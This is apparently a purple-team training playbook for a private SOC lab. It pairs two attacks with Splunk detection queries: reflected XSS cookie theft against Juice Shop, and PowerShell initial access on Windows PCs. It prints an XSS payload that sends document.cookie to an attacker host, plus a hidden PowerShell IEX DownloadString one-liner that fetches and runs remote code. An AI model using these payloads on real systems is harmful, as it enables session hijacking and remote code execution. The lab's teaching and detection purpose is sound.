
# 🛡️ Karbonbike SOC Lab: Attack & Defense Playbook

**Role:** Purple Team / SOC Analyst
**Scope:** Kali Linux vs. Karbonbike Lab Infrastructure
**Tools:** Splunk, Wazuh, Suricata, OPNsense, Juice Shop

---

## 📜 Scenario 1: XSS & Session Hijacking
> **Goal:** Steal a user session cookie via Reflected XSS and replay it to hijack the account.

### 🔴 Red Team: Execution Phase

**Target:** Juice Shop (`172.16.58.133`) | **Attacker:** Kali (`172.16.58.54`)

<details>
<summary><strong>🔻 1. Recon & Discovery Commands</strong></summary>

```bash
# Port Scan
nmap -sV 172.16.58.133

# Directory Brute-forcing
gobuster dir -u [http://172.16.58.133:3000](http://172.16.58.133:3000) -w /usr/share/wordlists/dirb/common.txt
````

\</details\>

\<details\>
\<summary\>\<strong\>🔻 2. Weaponization & Listener Setup\</strong\>\</summary\>

**Payload:**

```html
<img src="[http://172.16.58.54:8081/log?c='+document.cookie](http://172.16.58.54:8081/log?c='+document.cookie)+'" />
```

**Kali Listener:**

```bash
mkdir -p ~/xss-logs && cd ~/xss-logs
python3 -m http.server 8081
```

\</details\>

\<details\>
\<summary\>\<strong\>🔻 3. Delivery & Exploitation\</strong\>\</summary\>

1.  Inject payload into the vulnerable search field.
2.  Wait for victim (PC1) to click.
3.  Check Kali terminal for `GET /log?c=...`
4.  **Action:** Inject stolen cookie into browser DevTools to hijack session.

\</details\>

-----

### 🔵 Blue Team: Detection Phase

| Log Source | Technology | Objective |
| :--- | :--- | :--- |
| **Application** | Juice Shop (Filebeat) | Detect malicious strings (`<script>`, `document.cookie`) in URI/Post data. |
| **Network** | Suricata / Zenarmor | Detect XSS signatures and traffic to known malicious IPs. |
| **Correlation** | Splunk | Correlate App logs (Payload) with Network logs (Callback). |

\<details\>
\<summary\>\<strong\>🔎 SPL: App Layer Detection (Juice Shop)\</strong\>\</summary\>

**Broad Search:**

```spl
index=wazuh sourcetype="juiceshop:app"
| search "<script" OR "onerror=" OR "document.cookie" OR "<img src="
| table _time src_ip uri_path status message
| sort -_time
```

\</details\>

\<details\>
\<summary\>\<strong\>🔎 SPL: Network Layer (Suricata/Zenarmor)\</strong\>\</summary\>

**Traffic Analysis:**

```spl
index=main sourcetype=suricata OR sourcetype=zenarmor dest_ip=172.16.58.133
| stats count by src_ip dest_ip dest_port app proto
| sort -count
```

**Signature Match:**

```spl
index=main sourcetype=suricata dest_ip=172.16.58.133
| search signature="*XSS*" OR signature="*cross-site*"
| table _time src_ip dest_ip dest_port signature severity
```

\</details\>

\<details\>
\<summary\>\<strong\>🔗 SPL: Cross-Layer Correlation\</strong\>\</summary\>

```spl
index=wazuh sourcetype="juiceshop:app"
| search "<script" OR "document.cookie"
| stats values(src_ip) as attacker_ips

index=main sourcetype=suricata OR sourcetype=zenarmor
| search src_ip IN($attacker_ips$)
| stats count by src_ip dest_ip dest_port signature
```

\</details\>

<br>

-----

## 📜 Scenario 2: PowerShell Initial Access

> **Goal:** Gain code execution on a Windows Endpoint (PC1/PC2) via a malicious PowerShell one-liner.

### 🔴 Red Team: Execution Phase

**Target:** Windows PC1/PC2 | **Attacker:** Kali (`172.16.58.54`)

\<details\>
\<summary\>\<strong\>🔻 1. Payload Hosting (Kali)\</strong\>\</summary\>

```bash
# Create a harmless "malware" script
echo 'Write-Output "Simulated Malware Running"' > harmless.ps1

# Host it
python3 -m http.server 8082
```

\</details\>

\<details\>
\<summary\>\<strong\>🔻 2. Execution (Windows PowerShell)\</strong\>\</summary\>

Run this one-liner on the victim machine:

```powershell
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('[http://172.16.58.54:8082/harmless.ps1](http://172.16.58.54:8082/harmless.ps1)')"
```

\</details\>

-----

### 🔵 Blue Team: Detection Phase

| Log Source | Technology | Objective |
| :--- | :--- | :--- |
| **Endpoint** | Sysmon / Wazuh | Detect `powershell.exe` spawning network connections or using `IEX`. |
| **Network** | Suricata | Detect outbound HTTP traffic to the attacker's Python server port. |

\<details\>
\<summary\>\<strong\>🔎 SPL: Endpoint Process Analysis\</strong\>\</summary\>

**Wazuh Alerts:**

```spl
index=wazuh sourcetype="wazuh-alerts"
| search data.win.eventdata.Image="*powershell.exe*"
| table _time agent.name data.win.eventdata.CommandLine rule.description
| sort -_time
```

**Sysmon (EventCode 1):**

```spl
index=wazuh sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| search Image="*powershell.exe*"
| table _time Computer Image CommandLine ParentImage ParentCommandLine
```

\</details\>

\<details\>
\<summary\>\<strong\>🔎 SPL: Network Callback\</strong\>\</summary\>

```spl
index=main sourcetype=suricata OR sourcetype=zenarmor
| search dest_ip=172.16.58.54 dest_port=8082
| stats count by src_ip dest_ip dest_port app proto
| sort -_time
```

\</details\>

<br>

-----

## 🎓 Workshop Guide

| Time | Activity |
| :--- | :--- |
| **00:00** | **Overview:** Review `lab-topology.md` and log flow. |
| **00:10** | **Scenario 1 (XSS):** Run Attack A → Review Splunk Dashboard. |
| **00:40** | **Scenario 2 (PS1):** Run Attack B → Review Process Tree. |
| **01:10** | **Discussion:** Scaling detections & hunting with Velociraptor. |

```
```
